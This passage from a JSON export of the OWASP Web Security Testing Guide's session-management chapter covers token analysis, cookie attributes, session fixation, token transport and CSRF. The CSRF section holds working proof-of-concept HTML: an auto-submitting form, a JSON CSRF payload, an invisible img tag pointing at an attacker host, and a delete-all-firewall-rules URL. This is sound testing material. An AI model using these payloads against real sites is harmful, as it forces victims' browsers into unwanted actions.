encoded portion, such as owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412 .</p><p>Having analyzed a single session token, the representative sample should be examined. A simple analysis of the tokens should immediately reveal any obvious patterns. For example, a 32 bit token may include 16 bits of static data and 16 bits of variable data. This may indicate that the first 16 bits represent a fixed attribute of the user – e.g. the username or IP address. If the second 16 bit chunk is incrementing at a regular rate, it may indicate a sequential or even time-based element to the token generation. See examples.</p><p>If static elements to the Tokens are identified, further samples should be gathered, varying one potential input element at a time. For example, log in attempts through a different user account or from a different IP address may yield a variance in the previously static portion of the session token.</p><p>The following areas should be addressed during the single and multiple Session ID structure testing:</p><ul><li>What parts of the Session ID are static?</li><li>What clear-text confidential information is stored in the Session ID? E.g. usernames/UID, IP addresses</li><li>What easily decoded confidential information is stored?</li><li>What information can be deduced from the structure of the Session ID?</li><li>What portions of the Session ID are static for the same log in conditions?</li><li>What obvious patterns are present in the Session ID as a whole, or individual portions?</li></ul><p>Analysis of the variable areas (if any) of the Session ID should be undertaken to establish the existence of any recognizable or predictable patterns. These analyses may be performed manually and with bespoke or OTS statistical or cryptanalytic tools to deduce any patterns in the Session ID content. Manual checks should include comparisons of Session IDs issued for the same login conditions – e.g., the same username, password, and IP address.</p><p>Time is an important factor which must also be controlled. High numbers of simultaneous connections should be made in order to gather samples in the same time window and keep that variable constant. Even a quantization of 50ms or less may be too coarse and a sample taken in this way may reveal time-based components that would otherwise be missed.</p><p>Variable elements should be analyzed over time to determine whether they are incremental in nature. Where they are incremental, patterns relating to absolute or elapsed time should be investigated. Many systems use time as a seed for their pseudo-random elements. Where the patterns are seemingly random, one-way hashes of time or other environmental variations should be considered as a possibility. Typically, the result of a cryptographic hash is a decimal or hexadecimal number so should be identifiable.</p><p>In analyzing Session ID sequences, patterns or cycles, static elements and client dependencies should all be considered as possible contributing elements to the structure and function of the application.</p><ul><li>Are the Session IDs provably random in nature? Can the resulting values be reproduced?</li><li>Do the same input conditions produce the same ID on a subsequent run?</li><li>Are the Session IDs provably resistant to statistical or cryptanalysis?</li><li>What elements of the Session IDs are time-linked?</li><li>What portions of the Session IDs are predictable?</li><li>Can the next ID be deduced, given full knowledge of the generation algorithm and previous IDs?</li></ul><p>Now that the tester has enumerated the cookies and has a general idea of their use, it is time to have a deeper look at cookies that seem interesting. Which cookies is the tester interested in? A cookie, in order to provide a secure method of session management, must combine several characteristics, each of which is aimed at protecting the cookie from a different class of attacks.</p><p>These characteristics are summarized below:</p><p>The approach here is to collect a sufficient number of instances of a cookie and start looking for patterns in their value. The exact meaning of “sufficient” can vary from a handful of samples, if the cookie generation method is very easy to break, to several thousands, if the tester needs to proceed with some mathematical analysis (e.g., chi-squares, attractors. See later for more information).</p><p>It is important to pay particular attention to the workflow of the application, as the state of a session can have a heavy impact on collected cookies. A cookie collected before being authenticated can be very different from a cookie obtained after the authentication.</p><p>Another aspect to keep into consideration is time. Always record the exact time when a cookie has been obtained, when there is the possibility that time plays a role in the value of the cookie (the server could use a timestamp as part of the cookie value). The time recorded could be the local time or the server’s timestamp included in the HTTP response (or both).</p><p>When analyzing the collected values, the tester should try to figure out all variables that could have influenced the cookie value and try to vary them one at the time. Passing to the server modified versions of the same cookie can be very helpful in understanding how the application reads and processes the cookie.</p><p>Examples of checks to be performed at this stage include:</p><ul><li>What character set is used in the cookie? Has the cookie a numeric value? alphanumeric? hexadecimal? What happens if the tester inserts in a cookie characters that do not belong to the expected charset?</li><li>Is the cookie composed of different sub-parts carrying different pieces of information? How are the different parts separated? With which delimiters? Some parts of the cookie could have a higher variance, others might be constant, others could assume only a limited set of values. Breaking down the cookie to its base components is the first and fundamental step.</li></ul><p>An example of an easy-to-spot structured cookie is the following:</p><pre><code>ID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q</code></pre><p>This example shows 5 different fields, carrying different types of data:</p><ul><li>ID – hexadecimal</li><li>CR – small integer</li><li>TM and LM – large integer. (And curiously they hold the same value. Worth to see what happens modifying one of them)</li><li>S – alphanumeric</li></ul><p>Even when no delimiters are used, having enough samples can help understand the structure.</p><p>Brute force attacks inevitably lead on from questions relating to predictability and randomness. The variance within the Session IDs must be considered together with application session duration and timeouts. If the variation within the Session IDs is relatively small, and Session ID validity is long, the likelihood of a successful brute-force attack is much higher.</p><p>A long Session ID (or rather one with a great deal of variance) and a shorter validity period would make it far harder to succeed in a brute force attack.</p><ul><li>How long would a brute-force attack on all possible Session IDs take?</li><li>Is the Session ID space large enough to prevent brute forcing? For example, is the length of the key sufficient when compared to the valid life-span?</li><li>Do delays between connection attempts with different Session IDs mitigate the risk of this attack?</li></ul><p>If the tester has access to the session management schema implementation, they can check for the following:</p><ul><li>Random Session TokenThe Session ID or Cookie issued to the client should not be easily predictable (don’t use linear algorithms based on predictable variables such as the client IP address). The use of cryptographic algorithms with key length of 256 bits is encouraged (like AES).</li><li>Token lengthSession ID will be at least 50 characters length.</li><li>Session Time-outSession token should have a defined time-out (it depends on the criticality of the application managed data)</li><li>Cookie configuration:non-persistent: only RAM memorysecure (set only on HTTPS channel):Set-Cookie: cookie=data; path=/; domain=.aaa.it; secureHTTPOnly(not readable by a script):Set-Cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly</li><li>non-persistent: only RAM memory</li><li>secure (set only on HTTPS channel):Set-Cookie: cookie=data; path=/; domain=.aaa.it; secure</li><li>HTTPOnly(not readable by a script):Set-Cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly</li></ul><p>Random Session Token</p><p>The Session ID or Cookie issued to the client should not be easily predictable (don’t use linear algorithms based on predictable variables such as the client IP address). The use of cryptographic algorithms with key length of 256 bits is encouraged (like AES).</p><p>Token length</p><p>Session ID will be at least 50 characters length.</p><p>Session Time-out</p><p>Session token should have a defined time-out (it depends on the criticality of the application managed data)</p><p>Cookie configuration:</p><ul><li>non-persistent: only RAM memory</li><li>secure (set only on HTTPS channel):Set-Cookie: cookie=data; path=/; domain=.aaa.it; secure</li><li>HTTPOnly(not readable by a script):Set-Cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly</li></ul><p>More information here: Testing for cookies attributes</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy Project (ZAP)- features a session token analysis mechanism.</li><li>Burp Sequencer</li><li>YEHG’s JHijack</li></ul><h3>References</h3><ul><li>RFC 2965 “HTTP State Management Mechanism”</li><li>RFC 1750 “Randomness Recommendations for Security”</li><li>Michal Zalewski: “Strange Attractors and TCP/IP Sequence Number Analysis” (2001)</li><li>Michal Zalewski: “Strange Attractors and TCP/IP Sequence Number Analysis - One Year Later” (2002)</li><li>Correlation Coefficient</li><li>ENT</li><li>DMA 2005-0614a - Global Hauri ViRobot Server cookie overflow</li><li>OWASP Code Review Guide</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-SESS-02": {
        "summary": "<h3>Summary</h3><p>Web Cookies (herein referred to as cookies) are often a key attack vector for malicious users (typically targeting other users) and the application should always take due diligence to protect cookies.</p><p>HTTP is a stateless protocol, meaning that it doesn’t hold any reference to requests being sent by the same user. In order to fix this issue, sessions were created and appended to HTTP requests. Browsers, as discussed in testing browser storage , contain a multitude of storage mechanisms. In that section of the guide, each is discussed thoroughly.</p><p>The most used session storage mechanism in browsers is cookie storage. Cookies can be set by the server, by including a Set-Cookie header in the HTTP response or via JavaScript. Cookies can be used for a multitude of reasons, such as:</p><ul><li>session management</li><li>personalization</li><li>tracking</li></ul><p>In order to secure cookie data, the industry has developed means to help lock down these cookies and limit their attack surface. Over time cookies have become a preferred storage mechanism for web applications, as they allow great flexibility in use and protection.</p><p>The means to protect the cookies are:</p><ul><li>Cookie Attributes</li><li>Cookie Prefixes</li></ul><h3>Test Objectives</h3><ul><li>Ensure that the proper security configuration is set for cookies.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Below, a description of every attribute and prefix will be discussed. The tester should validate that they are being used properly by the application. Cookies can be reviewed by using an intercepting proxy , or by reviewing the browser’s cookie jar.</p><p>The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS . This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS , an attacker could be able to redirect the user to send their cookie as part of non-protected requests.</p><p>The HttpOnly attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.</p><p>This doesn’t limit the whole attack surface of XSS attacks, as an attacker could still send request in place of the user, but limits immensely the reach of XSS attack vectors.</p><p>The Domain attribute is used to compare the cookie’s domain against the domain of the server for which the HTTP request is being made. If the domain matches or if it is a subdomain, then the path attribute will be checked next.</p><p>Note that only hosts that belong to the specified domain can set a cookie for that domain. Additionally, the domain attribute cannot be a top level domain (such as .gov or .com ) to prevent servers from setting arbitrary cookies for another domain (such as setting a cookie for owasp.org ). If the domain attribute is not set, then the hostname of the server that generated the cookie is used as the default value of the domain .</p><p>For example, if a cookie is set by an application at app.mydomain.com with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for app.mydomain.com , but not its subdomains (such as hacker.app.mydomain.com ), or to otherapp.mydomain.com . (However, older versions of Edge/IE behave differently, and do send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the domain attribute to mydomain.com . In this case the cookie would be sent to all requests for app.mydomain.com and mydomain.com subdomains, such as hacker.app.mydomain.com , and even bank.mydomain.com . If there was a vulnerable server on a subdomain (for example, otherapp.mydomain.com ) and the domain attribute has been set too loosely (for example, mydomain.com ), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of mydomain.com .</p><p>The Path attribute plays a major role in setting the scope of the cookies in conjunction with the domain . In addition to the domain, the URL path that the cookie is valid for can be specified. If the domain and path match, then the cookie will be sent in the request. Just as with the domain attribute, if the path attribute is set too loosely, then it could leave the application vulnerable to attacks by other applications on the same server. For example, if the path attribute was set to the web server root / , then the application cookies will be sent to every application within the same domain (if multiple application reside under the same server). A couple of examples for multiple applications under the same server:</p><ul><li>path=/bank</li><li>path=/private</li><li>path=/docs</li><li>path=/docs/admin</li></ul><p>The Expires attribute is used to:</p><ul><li>set persistent cookies</li><li>limit lifespan if a session lives for too long</li><li>remove a cookie forcefully by setting it to a past date</li></ul><p>Unlike session cookies , persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.</p><p>The SameSite attribute can be used to assert whether a cookie should be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-origin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks. This attribute can be configured in three different modes:</p><ul><li>Strict</li><li>Lax</li><li>None</li></ul><p>The Strict value is the most restrictive usage of SameSite , allowing the browser to send the cookie only to first-party context without top-level navigation. In other words, the data associated with the cookie will only be sent on requests matching the current site shown on the browser URL bar. The cookie will not be sent on requests generated by third-party sites. This value is especially recommended for actions performed at the same domain. However, it can have some limitations with some session management systems negatively affecting the user navigation experience. Since the browser would not send the cookie on any requests generated from a third-party domain or email, the user would be required to sign in again even if they already have an authenticated session.</p><p>The Lax value is less restrictive than Strict . The cookie will be sent if the URL equals the cookie’s domain (first-party) even if the link is coming from a third-party domain. This value is considered by most browsers the default behavior since it provides a better user experience than the Strict value. It doesn’t trigger for assets, such as images, where cookies might not be needed to access them.</p><p>The None value specifies that the browser will send the cookie in all contexts, including cross-site requests (the normal behavior before the implementation of SameSite ). If Samesite=None is set, then the Secure attribute must be set, otherwise modern browsers will ignore the SameSite attribute, e.g. SameSite=None; Secure .</p><p>By design cookies do not have the capabilities to guarantee the integrity and confidentiality of the information stored in them. Those limitations make it impossible for a server to have confidence about how a given cookie’s attributes were set at creation. In order to give the servers such features in a backwards-compatible way, the industry has introduced the concept of Cookie Name Prefixes to facilitate passing such details embedded as part of the cookie name.</p><p>The __Host- prefix expects cookies to fulfill the following conditions:</p><p>For this reason, the cookie Set-Cookie: __Host-SID=12345; Secure; Path=/ would be accepted while any of the following ones would always be rejected: Set-Cookie: __Host-SID=12345 Set-Cookie: __Host-SID=12345; Secure Set-Cookie: __Host-SID=12345; Domain=site.example Set-Cookie: __Host-SID=12345; Domain=site.example; Path=/ Set-Cookie: __Host-SID=12345; Secure; Domain=site.example; Path=/</p><p>The __Secure- prefix is less restrictive and can be introduced by adding the case-sensitive string __Secure- to the cookie name. Any cookie that matches the prefix __Secure- would be expected to fulfill the following conditions:</p><p>Based on the application needs, and how the cookie should function, the attributes and prefixes must be applied. The more the cookie is locked down, the better.</p><p>Putting all this together, we can define the most secure cookie attribute configuration as: Set-Cookie: __Host-SID=<session token>; path=/; Secure; HttpOnly; SameSite=Strict .</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>Web Proxy Burp Suite</li></ul><ul><li>Tamper Data for FF Quantum</li><li>“FireSheep” for FireFox</li><li>“EditThisCookie” for Chrome</li><li>“Cookiebro - Cookie Manager” for FireFox</li></ul><h3>References</h3><ul><li>RFC 2965 - HTTP State Management Mechanism</li><li>RFC 2616 – Hypertext Transfer Protocol – HTTP 1.1</li><li>Same-Site Cookies - draft-ietf-httpbis-cookie-same-site-00</li><li>The important “expires” attribute of Set-Cookie</li><li>HttpOnly Session ID in URL and Page Body</li><li>Internet Explorer Cookie Internals (FAQ)</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-SESS-03": {
        "summary": "<h3>Summary</h3><p>Session fixation is enabled by the insecure practice of preserving the same value of the session cookies before and after authentication. This typically happens when session cookies are used to store state information even before login, e.g., to add items to a shopping cart before authenticating for payment.</p><p>In the generic exploit of session fixation vulnerabilities, an attacker can obtain a set of session cookies from the target site without first authenticating. The attacker can then force these cookies into the victim’s browser using different techniques. If the victim later authenticates at the target site and the cookies are not refreshed upon login, the victim will be identified by the session cookies chosen by the attacker. The attacker is then able to impersonate the victim with these known cookies.</p><p>This issue can be fixed by refreshing the session cookies after the authentication process. Alternatively, the attack can be prevented by ensuring the integrity of session cookies. When considering network attackers, i.e., attackers who control the network used by the victim, use full HSTS or add the __Host- / __Secure- prefix to the cookie name.</p><p>Full HSTS adoption occurs when a host activates HSTS for itself and all its sub-domains. This is described in a paper called Testing for Integrity Flaws in Web Sessions by Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo, and Michele Bugliesi.</p><h3>Test Objectives</h3><ul><li>Analyze the authentication mechanism and its flow.</li><li>Force cookies and assess the impact.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In this section we give an explanation of the testing strategy that will be shown in the next section.</p><p>The first step is to make a request to the site to be tested ( e.g. www.example.com ). If the tester requests the following:</p><pre><code>GET / HTTP/1.1\nHost: www.example.com</code></pre><p>They will obtain the following response:</p><pre><code>HTTP/1.1 200 OK\nDate: Wed, 14 Aug 2008 08:45:11 GMT\nServer: IBM_HTTP_Server\nSet-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure\nCache-Control: no-cache=\"set-cookie,set-cookie2\"\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html;charset=Cp1254\nContent-Language: en-US</code></pre><p>The application sets a new session identifier, JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1 , for the client.</p><p>Next, if the tester successfully authenticates to the application with the following POST to https://www.example.com/authentication.php :</p><pre><code>POST /authentication.php HTTP / 1.1 Host : www.example.com [...] Referer : https://www.example.com Cookie : JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1 Content-Type : application/x-www-form-urlencoded Content-length : 57 Name=Meucci&wpPassword=secret!&wpLoginattempt=Log+in</code></pre><p>The tester observes the following response from the server:</p><pre><code>HTTP / 1.1 200 OK Date : Thu, 14 Aug 2008 14:52:58 GMT Server : Apache/2.2.2 (Fedora) X-Powered-By : PHP/5.1.6 Content-language : en Cache-Control : private, must-revalidate, max-age=0 X-Content-Encoding : gzip Content-length : 4090 Connection : close Content-Type : text/html; charset=UTF-8 ... HTML data ...</code></pre><p>As no new cookie has been issued upon a successful authentication, the tester knows that it is possible to perform session hijacking unless the integrity of the session cookie is ensured.</p><p>The tester can send a valid session identifier to a user (possibly using a social engineering trick), wait for them to authenticate, and subsequently verify that privileges have been assigned to this cookie.</p><p>This testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since all their cookies have integrity). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker forces in the victim’s browser all the cookies which are not freshly issued after login and do not have integrity. After the victim’s login, the attacker presents the forced cookies to the site to access the victim’s account: if they are enough to act on the victim’s behalf, session fixation is possible.</p><p>Here are the steps for executing this test:</p><p>We recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same steps, but it halts at step 6.</p>",
        "tools": "<h3>Tools</h3><ul><li>ZAP</li></ul><h3>References</h3><ul><li>Session Fixation</li><li>ACROS Security</li><li>Chris Shiflett</li></ul>",
        "remediation": "<h3>Remediation</h3><p>Implement a session token renewal after a user successfully authenticates.</p><p>The application should always first invalidate the existing session ID before authenticating a user, and if the authentication is successful, provide another session ID.</p>",
        "test_objectives": ""
    },
    "WSTG-SESS-04": {
        "summary": "<h3>Summary</h3><p>The Session Tokens (Cookie, SessionID, Hidden Field), if exposed, will usually enable an attacker to impersonate a victim and access the application illegitimately. It is important that they are protected from eavesdropping at all times, particularly whilst in transit between the client browser and the application servers.</p><p>The information here relates to how transport security applies to the transfer of sensitive Session ID data rather than data in general, and may be stricter than the caching and transport policies applied to the data served by the site.</p><p>Using a personal proxy, it is possible to ascertain the following about each request and response:</p><ul><li>Protocol used (e.g., HTTP vs. HTTPS)</li><li>HTTP Headers</li><li>Message Body (e.g., POST or page content)</li></ul><p>Each time Session ID data is passed between the client and the server, the protocol, cache, and privacy directives and body should be examined. Transport security here refers to Session IDs passed in GET or POST requests, message bodies, or other means over valid HTTP requests.</p><h3>Test Objectives</h3><ul><li>Ensure that proper encryption is implemented.</li><li>Review the caching configuration.</li><li>Assess the channel and methods’ security.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Protection from eavesdropping is often provided by TLS encryption, but may incorporate other tunneling or encryption. It should be noted that encryption or cryptographic hashing of the Session ID should be considered separately from transport encryption, as it is the Session ID itself being protected, not the data that may be represented by it.</p><p>If the Session ID could be presented by an attacker to the application to gain access, then it must be protected in transit to mitigate that risk. It should therefore be ensured that encryption is both the default and enforced for any request or response where the Session ID is passed, regardless of the mechanism used (e.g., a hidden form field). Simple checks such as replacing https:// with http:// during interaction with the application should be performed, together with modification of form posts to determine if adequate segregation between the secure and non-secure sites is implemented.</p><p>Note that if there is also an element to the site where the user is tracked with Session IDs but security is not present (e.g., noting which public documents a registered user downloads) it is essential that a different Session ID is used. The Session ID should therefore be monitored as the client switches from the secure to non-secure elements to ensure a different one is used.</p><p>Every time the authentication is successful, the user should expect to receive:</p><ul><li>A different session token</li><li>A token sent via encrypted channel every time they make an HTTP Request</li></ul><p>Proxies must also be considered when reviewing application security. In many cases, clients will access the application through corporate, ISP, or other proxies or protocol aware gateways (e.g., Firewalls). The HTTP protocol provides directives to control the behavior of downstream proxies, and the correct implementation of these directives should also be assessed.</p><p>In general, the Session ID should never be sent over unencrypted transport and should never be cached. The application should be examined to ensure that encrypted communications are both the default and enforced for any transfer of Session IDs. Furthermore, whenever the Session ID is passed, directives should be in place to prevent its caching by intermediate and even local caches.</p><p>The application should also be configured to secure data in caches over both HTTP/1.0 and HTTP/1.1 – RFC 2616 discusses the appropriate controls with reference to HTTP. HTTP/1.1 provides a number of cache control mechanisms. Cache-Control: no-cache indicates that a proxy must not re-use any data. Whilst Cache-Control: Private appears to be a suitable directive, this still allows a non-shared proxy to cache data. In the case of web-cafes or other shared systems, this presents a clear risk. Even with single-user workstations the cached Session ID may be exposed through a compromise of the file-system or where network stores are used. HTTP/1.0 caches do not recognise the Cache-Control: no-cache directive.</p><p>The Expires: 0 and Cache-Control: max-age=0 directives should be used to further ensure caches do not expose the data. Each request/response passing Session ID data should be examined to ensure appropriate cache directives are in use.</p><p>In general, GET requests should not be used, as the Session ID may be exposed in Proxy or Firewall logs. They are also far more easily manipulated than other types of transport, although it should be noted that almost any mechanism can be manipulated by the client with the right tools. Furthermore, Cross-site Scripting (XSS) attacks are most easily exploited by sending a specially constructed link to the victim. This is far less likely if data is sent from the client as POSTs.</p><p>All server-side code receiving data from POST requests should be tested to ensure it does not accept the data if sent as a GET. For example, consider the following POST request ( https://owaspapp.com/login.asp ) generated by a log in page.</p><pre><code>POST /login.asp HTTP / 1.1 Host : owaspapp.com [...] Cookie : ASPSESSIONIDABCDEFG=ASKLJDLKJRELKHJG Content-Length : 51 Login=Username&password=Password&SessionID=12345678</code></pre><p>If login.asp is badly implemented, it may be possible to log in using the following URL: https://owaspapp.com/login.asp?Login=Username&password=Password&SessionID=12345678</p><p>Potentially insecure server-side scripts may be identified by checking each POST in this way.</p><p>All interaction between the Client and Application should be tested at least against the following criteria.</p><ul><li>How are Session IDs transferred? e.g., GET, POST, Form Field (including hidden fields)</li><li>Are Session IDs always sent over encrypted transport by default?</li><li>Is it possible to manipulate the application to send Session IDs unencrypted? e.g., by changing HTTPS to HTTP?</li><li>What cache-control directives are applied to requests/responses passing Session IDs?</li><li>Are these directives always present? If not, where are the exceptions?</li><li>Are GET requests incorporating the Session ID used?</li><li>If POST is used, can it be interchanged with GET?</li></ul><h3>References</h3><ul><li>RFCs 2109 and 2965 – HTTP State Management Mechanism - D. Kristol, L. Montulli</li><li>RFC 2616 – Hypertext Transfer Protocol - HTTP/1.1</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-SESS-05": {
        "summary": "<h3>Summary</h3><p>Cross-Site Request Forgery ( CSRF ) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. With a little social engineering help (like sending a link via email or chat), an attacker may force the users of a web application to execute actions of the attacker’s choosing. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.</p><p>CSRF relies on:</p><p>Points 1, 2, and 3 are essential for the vulnerability to be present, while point 4 facilitates the actual exploitation, but is not strictly required.</p><p>For simplicity’s sake, consider GET-accessible URLs (though the discussion applies as well to POST requests). If victim has already authenticated themselves, submitting another request causes the cookie to be automatically sent with it. The figure below illustrates the user accessing an application on www.example.com .</p><p>Figure 4.6.5-1: Session Riding</p><br><p>The GET request could be sent by the user in several different ways:</p><ul><li>Using the web application</li><li>Typing the URL directly in the browser</li><li>Following an external link that points to the URL</li></ul><p>These invocations are indistinguishable by the application. In particular, the third may be quite dangerous. There are a number of techniques and vulnerabilities that can disguise the real properties of a link. The link can be embedded in an email message, appear in a malicious site to which the user is lured, or appear in content hosted by a third-party (such as another site or HTML email) and point to a resource of the application. If the user clicks on the link, since they are already authenticated by the web application on site , the browser will issue a GET request to the web application, accompanied by authentication information (the session ID cookie). This results in a valid operation being performed on the web application that the user does not expect; for example, a funds transfer on a web banking application.</p><p>By using a tag such as img , as specified in point 4 above, it is not even necessary that the user follows a particular link. Suppose the attacker sends the user an email inducing them to visit a URL referring to a page containing the following (oversimplified) HTML.</p><pre><code><html> <body> ... <img src= \"https://www.company.example/action\" width= \"0\" height= \"0\" > ... </body> </html></code></pre><p>When the browser displays this page, it will try to display the specified zero-dimension (thus, invisible) image from https://www.company.example as well. This results in a request being automatically sent to the web application hosted on site . It is not important that the image URL does not refer to a proper image, as its presence will trigger the request action specified in the src field anyway. This happens provided that image download is not disabled in the browser. Most browsers do not have image downloads disabled since that would cripple most web applications beyond usability.</p><p>The problem here is a consequence of:</p><ul><li>HTML tags on the page resulting in automatic HTTP request execution (imgbeing one of those).</li><li>The browser having no way to tell that the resource referenced byimgis not a legitimate image.</li><li>Image loading that happens regardless of the location of the alleged image source, i.e., the form and the image itself need not be located on the same host or even the same domain.</li></ul><p>The fact that HTML content unrelated to the web application may refer to components in the application, and the fact that the browser automatically composes a valid request towards the application, allows this kind of attack. There is no way to prohibit this behavior unless it is made impossible for the attacker to interact with application functionality.</p><p>In integrated mail/browser environments, simply displaying an email message containing the image reference would result in the execution of the request to the web application with the associated browser cookie. Email messages may reference seemingly valid image URLs such as:</p><pre><code><img src= \"https://[attacker]/picture.gif\" width= \"0\" height= \"0\" ></code></pre><p>In this example, [attacker] is a site controlled by the attacker. By utilizing a redirect mechanism, the malicious site may use https://[attacker]/picture.gif to direct the victim to https://[thirdparty]/action and trigger the action .</p><p>Cookies are not the only example involved in this kind of vulnerability. Web applications whose session information is entirely supplied by the browser are vulnerable too. This includes applications relying on HTTP authentication mechanisms alone, since the authentication information is known by the browser and is sent automatically upon each request. This does not include form-based authentication, which occurs just once and generates some form of session-related information, usually a cookie.</p><p>Let’s suppose that the victim is logged on to a firewall web management console. To log in, a user has to authenticate themselves and session information is stored in a cookie.</p><p>Let’s suppose the firewall web management console has a function that allows an authenticated user to delete a rule specified by its numerical ID, or all the rules in the configuration if the user specifies * (a dangerous feature in reality, but one that makes for a more interesting example). The delete page is shown next. Let’s suppose that the form – for the sake of simplicity – issues a GET request. To delete rule number one:</p><pre><code>https://[target]/fwmgt/delete?rule=1</code></pre><p>To delete all rules:</p><pre><code>https://[target]/fwmgt/delete?rule=*</code></pre><p>This example is intentionally naive, but shows in a simplified way the dangers of CSRF.</p><p>Figure 4.6.5-2: Session Riding Firewall Management</p><br><p>Using the form pictured in the figure above, entering the value * and clicking the Delete button will submit the following GET request:</p><pre><code>https://www.company.example/fwmgt/delete?rule=*</code></pre><p>This would delete all firewall rules.</p><p>Figure 4.6.5-3: Session Riding Firewall Management 2</p><br><p>The user might also have accomplished the same results by manually submitting the URL:</p><pre><code>https://[target]/fwmgt/delete?rule=*</code></pre><p>Or by following a link pointing, directly or via a redirection, to the above URL. Or, again, by accessing an HTML page with an embedded img tag pointing to the same URL.</p><p>In all of these cases, if the user is currently logged in to the firewall management application, the request will succeed and will modify the configuration of the firewall. One can imagine attacks targeting sensitive applications and making automatic auction bids, money transfers, orders, changing the configuration of critical software components, etc.</p><p>An interesting thing is that these vulnerabilities may be exercised behind a firewall; i.e. it is sufficient that the link being attacked be reachable by the victim and not directly by the attacker. In particular, it can be any intranet web server; for example, in the firewall management scenario mentioned before, which is unlikely to be exposed to the internet.</p><p>Self-vulnerable applications, i.e. applications that are used both as attack vector and target (such as web mail applications), make things worse. Since users are logged in when they read their email messages, a vulnerable application of this type can allow attackers to perform actions such as deleting messages or sending messages that appear to originate from the victim.</p><h3>Test Objectives</h3><ul><li>Determine whether it is possible to initiate requests on a user’s behalf that are not initiated by the user.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Audit the application to ascertain if its session management is vulnerable. If session management relies only on client-side values (information available to the browser), then the application is vulnerable. “Client-side values” refers to cookies and HTTP authentication credentials (Basic Authentication and other forms of HTTP authentication; not form-based authentication, which is an application-level authentication).</p><p>Resources accessible via HTTP GET requests are easily vulnerable, though POST requests can be automated via JavaScript and are vulnerable as well; therefore, the use of POST alone is not enough to correct the occurrence of CSRF vulnerabilities.</p><p>In case of POST, the following sample can be used.</p><pre><code><html> <body onload= 'document.CSRF.submit()' > <form action= 'https://targetWebsite/Authenticate.jsp' method= 'POST' name= 'CSRF' > <input type= 'hidden' name= 'name' value= 'Hacked' > <input type= 'hidden' name= 'password' value= 'Hacked' > </form> </body> </html></code></pre><p>In case of web applications in which developers are utilizing JSON for browser to server communication, a problem may arise with the fact that there are no query parameters with the JSON format, which are a must with self-submitting forms. To bypass this case, we can use a self-submitting form with JSON payloads including hidden input to exploit CSRF. We’ll have to change the encoding type ( enctype ) to text/plain to ensure the payload is delivered as-is. The exploit code will look like the following:</p><pre><code><html> <body> <script> history . pushState ( '' , '' , ' / ' ) </script> <form action= 'https://victimsite.com' method= 'POST' enctype= 'text/plain' > <input type= 'hidden' name= '{\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"' value= 'something\"}' /> <input type= 'submit' value= 'Submit request' /> </form> </body> </html></code></pre><p>The POST request will be as follow:</p><pre><code>POST / HTTP / 1.1 Host : victimsite.com Content-Type : text/plain {\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"=something\"}</code></pre><p>When this data is sent as a POST request, the server will happily accept the name and password fields and ignore the one with the name padding as it does not need it.</p>",
        "tools": "<h3>Tools</h3><ul><li>ZAP</li><li>CSRF Tester</li><li>Pinata-csrf-tool</li></ul><h3>References</h3><ul><li>Peter W: “Cross-Site Request Forgeries”</li><li>Thomas Schreiber: “Session Riding”</li><li>Oldest known post</li><li>Cross-site Request Forgery FAQ</li><li>A Most-Neglected Fact About Cross Site Request Forgery (CSRF)</li><li>Multi-POST CSRF</li><li>SANS Pen Test Webcast: Complete Application pwnage via Multi POST XSRF</li></ul>",
        "remediation": "<h3>Remediation</h3><ul><li>See theOWASP CSRF Prevention Cheat Sheetfor prevention measures.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-SESS-06": {
